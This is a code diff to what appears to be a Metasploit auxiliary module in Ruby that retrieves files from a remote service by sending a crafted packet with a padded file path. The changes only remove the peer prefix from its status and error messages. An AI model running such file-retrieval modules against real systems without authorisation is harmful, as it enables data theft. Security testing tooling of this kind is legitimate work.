@@ -46,12 +46,12 @@ class Metasploit4 < Msf::Auxiliary
   def get_file
     res = sock.get_once
     unless res
-      print_error("#{peer} - Unable to retrieve file due to a timeout.")
+      print_error("Unable to retrieve file due to a timeout.")
       return
     end
 
     unless res.length == 261
-      print_error("#{peer} - Received a response of an invalid size.")
+      print_error("Received a response of an invalid size.")
       return
     end
 
@@ -61,7 +61,7 @@ class Metasploit4 < Msf::Auxiliary
       contents << sock.get_once
     end
 
-    print_status("#{peer} - File retrieved successfully (#{contents.length} bytes)!")
+    print_status("File retrieved successfully (#{contents.length} bytes)!")
     contents
   end
 
@@ -77,7 +77,7 @@ class Metasploit4 < Msf::Auxiliary
     packet << "\x00" * (255 - file_path.length)
     packet << "\x01\x00\x00\x00\x01"
 
-    vprint_status("#{peer} - Sending request (#{packet.length} bytes)")
+    vprint_status("Sending request (#{packet.length} bytes)")
     connect
     sock.put(packet)
 
